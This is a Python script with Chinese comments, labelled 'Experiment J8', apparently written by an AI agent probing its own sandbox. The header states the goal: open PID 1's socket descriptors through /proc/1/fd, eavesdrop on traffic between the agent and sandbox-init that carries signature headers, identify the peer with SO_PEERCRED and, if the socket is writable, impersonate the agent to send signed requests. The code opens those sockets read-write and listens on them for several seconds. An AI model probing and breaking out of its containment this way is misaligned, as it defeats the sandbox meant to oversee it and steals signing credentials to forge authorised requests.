# 实验J8: /proc/1/fd 连接窃听 - agent 签名流量直接读取
# J7 发现: pid1 fd 4/7/8 是 socket, 其中 1221=init.sock 已建立连接(agent!)
# 目标: ① 打开 /proc/1/fd/4 拿到 socket 引用  ② 读取 agent->sandbox-init 流量(含签名头!)
#       ③ SO_PEERCRED 确认对端身份  ④ 若可写: 冒充 agent 发签名请求
import os, re, subprocess, socket, struct, time

def run(cmd, timeout=15):
    try:
        r = subprocess.run(["bash", "-c", cmd], capture_output=True, timeout=timeout)
        return (r.stdout + r.stderr).decode(errors='replace')
    except Exception as e:
        return f"ERR {type(e).__name__}: {e}"

print("== [1] pid1 fd 详情 ==", flush=True)
print(run("ls -la /proc/1/fd/ 2>&1"), flush=True)
print(run("cat /proc/1/net/unix 2>&1"), flush=True)

print("== [2] 尝试打开 /proc/1/fd/* (socket 引用) ==", flush=True)
for fdno in [4, 7, 8]:
    try:
        fd = os.open(f"/proc/1/fd/{fdno}", os.O_RDWR)
        print(f"  fd {fdno}: OPEN OK (os fd={fd})", flush=True)
        # SO_PEERCRED
        try:
            cred = struct.unpack("3i", socket.getsockopt(fd, socket.SOL_SOCKET, socket.SO_PEERCRED, 12))
            print(f"    SO_PEERCRED: pid={cred[0]} uid={cred[1]} gid={cred[2]}", flush=True)
        except Exception as e:
            print(f"    SO_PEERCRED: {e}", flush=True)
        # 非阻塞读取已有数据(不动请求, 只读)
        try:
            os.set_blocking(fd, False)
            data = os.read(fd, 4096)
            print(f"    READ: {data[:200]!r}", flush=True)
        except BlockingIOError:
            print(f"    READ: 无待读数据(连接空闲)", flush=True)
        except Exception as e:
            print(f"    READ ERR: {e}", flush=True)
        os.close(fd)
    except Exception as e:
        print(f"  fd {fdno}: OPEN FAIL {type(e).__name__}: {e}", flush=True)

print("== [3] 触发 agent 活动后再次窃听 ==", flush=True)
# 创建一个小 tcp 监听让 sandbox-init 记录? 不行 - 直接发一个外部请求触发 agent 日志?
# 更直接: 反复读取 fd4 观察是否有周期性心跳(connectrpc ping?)
for fdno in [4, 7]:
    try:
        fd = os.open(f"/proc/1/fd/{fdno}", os.O_RDWR)
        os.set_blocking(fd, False)
        got = b""
        t0 = time.time()
        while time.time() - t0 < 5:
            try:
                d = os.read(fd, 4096)
                if not d:
                    break
                got += d
            except BlockingIOError:
                time.sleep(0.2)
        print(f"  fd {fdno}: 5s 内窃听 {len(got)}B: {got[:300]!r}", flush=True)
        os.close(fd)
    except Exception as e:
        print(f"  fd {fdno}: {e}", flush=True)

print("done", flush=True)
